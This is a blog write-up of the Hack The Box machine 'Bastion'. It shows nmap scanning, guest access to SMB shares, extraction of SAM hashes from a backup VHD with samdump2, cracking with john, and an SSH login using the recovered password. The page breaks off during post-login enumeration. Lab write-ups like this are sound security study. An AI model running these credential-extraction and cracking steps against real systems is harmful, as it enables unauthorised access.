<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Bastion" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this machine ! :)" /><meta property="og:description" content="I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this machine ! :)" /><link rel="canonical" href="https://rizemon.github.io/posts/bastion-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/bastion-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-09-07T23:11:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Bastion" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/bastion-htb/"},"description":"I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this machine ! :)","url":"https://rizemon.github.io/posts/bastion-htb/","@type":"BlogPosting","headline":"Hack The Box - Bastion","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2019-09-07T23:11:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Bastion | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end">
<div class="profile-wrapper text-center">
<div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a>
</div>
<div class="site-title mt-3"> <a href="/">rizemon's blog</a>
</div>
<div class="site-subtitle font-italic">Cyber Security Enthusiast.</div>
</div>
<ul class="w-100">
<li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a>
</li>
<li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a>
</li>
<li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a>
</li>
<li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a>
</li>
<li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a>
</li>
</ul>
<div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href%20=%20'mailto:'%20+%20%5B'',''%5D.join('@')" aria-label="email" class="order-5"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6"> <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span>
</div>
</div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Bastion</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div>
<i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel">Cancel</span>
</div></div><div id="main-wrapper">
<div id="main">
<div class="row">
<div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
<h1 data-toc-skip>Hack The Box - Bastion</h1>
<div class="post-meta text-muted d-flex flex-column">
<div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 7, 2019, 11:11 PM +0800"> Sep 7, 2019 <i class="unloaded">2019-09-07T23:11:00+08:00</i> </span> by <span class="author"> rizemon </span>
</div>
<div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800"> Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2613 words">14 min</span>
</div>
</div>
<div class="post-content">
<p>I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this machine ! :)</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/bastion.png" alt="" height="414px" width="615px"></p>
<h1 id="configuration">Configuration</h1>
<p>The operating systems that I will be using to tackle this machine is a Kali Linux VM and a Windows Commando VM.</p>
<p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.134 bastion.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="reconnaissance">Reconnaissance</h1>
<p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> bastion.htb
Nmap scan report <span class="k">for </span>bastion.htb <span class="o">(</span>10.10.10.134<span class="o">)</span>
Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a <span class="o">(</span>RSA<span class="o">)</span>
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 <span class="o">(</span>ED25519<span class="o">)</span>
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: <span class="nt">-39m29s</span>, deviation: 1h09m15s, median: 29s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
|   Computer name: Bastion
|   NetBIOS computer name: BASTION<span class="se">\x</span>00
|   Workgroup: WORKGROUP<span class="se">\x</span>00
|_  System <span class="nb">time</span>: 2019-08-17T09:30:22+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2019-08-17 03:30:24
|_  start_date: 2019-08-17 03:09:17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>53.52 seconds

</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="enumeration-1">Enumeration (1)</h1>
<p>Not much can be done with the <code class="language-plaintext highlighter-rouge">ssh</code> service as we do not have any credentials on hand so lets come back to it later. As for the <code class="language-plaintext highlighter-rouge">smb</code> service, maybe we can try logging into it and see what we can find ?</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>smbclient <span class="nt">-L</span> bastion.htb
	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
	Backups         Disk      
	C<span class="nv">$ </span>             Disk      Default share
	IPC<span class="nv">$ </span>           IPC       Remote IPC

<span class="nv">$ </span>smbmap <span class="nt">-H</span> bastion.htb <span class="nt">-U</span> Guest
<span class="o">[</span>+] Finding open SMB ports....
<span class="o">[</span>+] User SMB session establishd on bastion.htb...
<span class="o">[</span>+] IP: bastion.htb:445	Name: bastion.htb                                       
	Disk                                                  	Permissions
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>
	ADMIN<span class="nv">$ </span>                                           	    NO ACCESS
	Backups                                           	    READ, WRITE
	C<span class="nv">$ </span>                                               	    NO ACCESS
	IPC<span class="nv">$ </span>                                             	    READ ONLY

</pre></td>
</tr></tbody></table></code></div></div>
<p>Alright, the <code class="language-plaintext highlighter-rouge">Backups</code> share seems interesting. Lets check it out.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>smbclient //bastion.htb/Backups
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Wed Aug 28 03:22:24 2019
  ..                                  D        0  Wed Aug 28 03:22:24 2019
  AfupChGEOm                          D        0  Wed Aug 28 03:17:54 2019
  ApQryGFzjG                          D        0  Wed Aug 28 03:19:48 2019
  gcMteSJf.exe                        A    15872  Wed Aug 28 03:22:37 2019
  hBHyUtVj.exe                        A     2500  Wed Aug 28 03:22:10 2019
  kyMeCYlTrO                          D        0  Wed Aug 28 03:17:40 2019
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019

		7735807 blocks of size 4096. 2776236 blocks available

</pre></td>
</tr></tbody></table></code></div></div>
<p>Looks like someone left a <code class="language-plaintext highlighter-rouge">note.txt</code> on the share.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td>
<td class="rouge-code"><pre>smb: <span class="se">\&gt;</span> more note.txt
Sysadmins: please don<span class="s1">'t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
</span></pre></td>
</tr></tbody></table></code></div></div>
<p>At this point of time, I did not understand the meaning of this message so I simply ignored it. Another thing that caught my attention was the <code class="language-plaintext highlighter-rouge">WindowsImageBackup</code> directory.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td>
<td class="rouge-code"><pre>smb: <span class="se">\&gt;</span> <span class="nb">cd </span>WindowsImageBackup
smb: <span class="se">\W</span>indowsImageBackup<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Feb 22 07:44:02 2019
  ..                                  D        0  Fri Feb 22 07:44:02 2019
  L4mpje-PC                           D        0  Fri Feb 22 07:45:32 2019

		7735807 blocks of size 4096. 2776046 blocks available
smb: <span class="se">\W</span>indowsImageBackup<span class="se">\&gt;</span> <span class="nb">cd </span>L4mpje-PC
smb: <span class="se">\W</span>indowsImageBackup<span class="se">\L</span>4mpje-PC<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Fri Feb 22 07:45:32 2019
  ..                                  D        0  Fri Feb 22 07:45:32 2019
  Backup 2019-02-22 124351            D        0  Fri Feb 22 07:45:32 2019
  Catalog                             D        0  Fri Feb 22 07:45:32 2019
  MediaId                             A       16  Fri Feb 22 07:44:02 2019
  SPPMetadataCache                    D        0  Fri Feb 22 07:45:32 2019

		7735807 blocks of size 4096. 2776046 blocks available
</pre></td>
</tr></tbody></table></code></div></div>
<p>Oh no this feels like a rabbit hole already but <code class="language-plaintext highlighter-rouge">Backup 2019-02-22 124351</code> seems hopeful.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td>
<td class="rouge-code"><pre>smb: <span class="se">\W</span>indowsImageBackup<span class="se">\L</span>4mpje-PC<span class="se">\&gt;</span> <span class="nb">cd</span> <span class="s2">"Backup 2019-02-22 124351"</span>
smb: <span class="se">\W</span>indowsImageBackup<span class="se">\L</span>4mpje-PC<span class="se">\B</span>ackup 2019-02-22 124351<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                                                                              D          0   Fri Feb 22 07:45:32 2019
  ..                                                                                             D          0   Fri Feb 22 07:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd                                                       A   37761024   Fri Feb 22 07:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd                                                       A 5418299392   Fri Feb 22 07:45:32 2019
  BackupSpecs.xml                                                                                A       1186   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml   A       1078   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml                                            A       8930   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml                                      A       6542   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml            A       2894   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml            A       1488   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml            A       1484   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml            A       3844   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml            A       3988   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml            A       7110   Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml            A    2374620   Fri Feb 22 07:45:32 2019

		7735807 blocks of size 4096. 2776046 blocks available

</pre></td>
</tr></tbody></table></code></div></div>
<p>The <code class="language-plaintext highlighter-rouge">.vhd</code> files seem worth checking out. Lets try downloading them.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td>
<td class="rouge-code"><pre>smb: <span class="se">\W</span>indowsImageBackup<span class="se">\L</span>4mpje-PC<span class="se">\B</span>ackup 2019-02-22 124351<span class="se">\&gt;</span> get 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
parallel_read returned NT_STATUS_IO_TIMEOUT
getting file <span class="se">\W</span>indowsImageBackup<span class="se">\L</span>4mpje-PC<span class="se">\B</span>ackup 2019-02-22 124351<span class="se">\9</span>b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd 
of size 37761024 as 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd SMBecho failed <span class="o">(</span>NT_STATUS_INVALID_NETWORK_RESPONSE<span class="o">)</span><span class="nb">.</span> 
The connection is disconnected now
</pre></td>
</tr></tbody></table></code></div></div>
<p>What just happened ? <code class="language-plaintext highlighter-rouge">NT_STATUS_IO_TIMEOUT</code> ? Was the file too big to be transferred ? This was where I finally understood the message when it said <code class="language-plaintext highlighter-rouge">don't transfer the entire backup file</code> and the <code class="language-plaintext highlighter-rouge">VPN to the subsidiary office is too slow</code>. Seems like we can’t rely on <code class="language-plaintext highlighter-rouge">smbclient</code> to retrieve the files :/ This was where it struck me to use a Windows VM. I had heard of a Offensive Windows distribution VM by FireEye and felt that it was a good chance to try it out!</p>
<p>After setting up the Commando VM, I attempted to access the share and it worked !</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/bastion1.png" alt=""></p>
<p>After downloading the <code class="language-plaintext highlighter-rouge">.vhd</code> files which tooked quite a while, I mounted both of them.</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/bastion2.png" alt=""></p>
<p>Seems like a rather normal looking Windows file system. After looking through the user folders, I was not able to find anything but I found the SAM and SYSTEM files in the <code class="language-plaintext highlighter-rouge">Windows\System32\config</code> folder. Maybe we can dump out the passwords using these files ?</p>
<p>Using the <code class="language-plaintext highlighter-rouge">samdump2</code> command, we were able to extract the account hashes.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>samdump2 SYSTEM SAM <span class="nt">-o</span> hash.txt
<span class="nv">$ </span><span class="nb">cat </span>hash.txt
<span class="se">\*</span>disabled<span class="se">\*</span> Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<span class="se">\*</span>disabled<span class="se">\*</span> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
</pre></td>
</tr></tbody></table></code></div></div>
<p>Following up, we used <code class="language-plaintext highlighter-rouge">john</code> to cracked the NT hashes in <code class="language-plaintext highlighter-rouge">hash.txt</code> along with the <code class="language-plaintext highlighter-rouge">rockyou.txt</code> password list.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>john <span class="nt">--format</span><span class="o">=</span>nt hash.txt <span class="nt">-wordlist</span>:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts <span class="o">(</span>NT <span class="o">[</span>MD4 128/128 AVX 4x3]<span class="o">)</span>
Remaining 1 password <span class="nb">hash
</span>Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>4
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
bureaulampje     <span class="o">(</span>L4mpje<span class="o">)</span>
1g 0:00:00:01 DONE <span class="o">(</span>2019-08-17 07:47<span class="o">)</span> 0.5434g/s 5106Kp/s 5106Kc/s 5106KC/s buresres..burdy1
Warning: passwords printed above might not be all those cracked
Use the <span class="s2">"--show --format=NT"</span> options to display all of the cracked passwords reliably
Session completed
</pre></td>
</tr></tbody></table></code></div></div>
<h1 id="usertxt">user.txt</h1>
<p>Bingo, we got it ! With the password <code class="language-plaintext highlighter-rouge">bureaulampje</code>, we will now attempt to login via <code class="language-plaintext highlighter-rouge">ssh</code> using <code class="language-plaintext highlighter-rouge">L4mpje</code>’s credentials. The <code class="language-plaintext highlighter-rouge">user.txt</code> resided on his Desktop.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>ssh L4mpje@bastion.htb
L4mpje@bastion.htb<span class="s1">'s password: 

Microsoft Windows [Version 10.0.14393]                                           
(c) 2016 Microsoft Corporation. All rights reserved.   

l4mpje@BASTION C:\Users\L4mpje&gt;cd Desktop                                        

l4mpje@BASTION C:\Users\L4mpje\Desktop&gt;dir                                       
 Volume in drive C has no label.                                                 
 Volume Serial Number is 0CB3-C487                                               

 Directory of C:\Users\L4mpje\Desktop                                            

22-02-2019  16:27    &lt;DIR&gt;          .                                            
22-02-2019  16:27    &lt;DIR&gt;          ..                                           
23-02-2019  10:07                32 user.txt                                     
               1 File(s)             32 bytes                                    
               2 Dir(s)  11.381.809.152 bytes free

l4mpje@BASTION C:\Users\L4mpje\Desktop&gt;more user.txt                             
9bfeXXXXXXXXXXXXXXXXXXXXXXXXXXXX

</span></pre></td>
</tr></tbody></table></code></div></div>
<h1 id="enumeration-2">Enumeration (2)</h1>
<p>As <code class="language-plaintext highlighter-rouge">l4mpje</code>, we first checked out the installed programs.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">dir </span>C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span>
 Volume <span class="k">in </span>drive C has no label.                                                                               
 Volume Serial Number is 0CB3-C487                                                                             

 Directory of C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span>                                                                           

22-02-2019  15:01    &lt;DIR&gt;          <span class="nb">.</span>                                                                          
22-02-2019  15:01    &lt;DIR&gt;          ..                                                                         
16-07-2016  15:23    &lt;DIR&gt;          Common Files                                                               
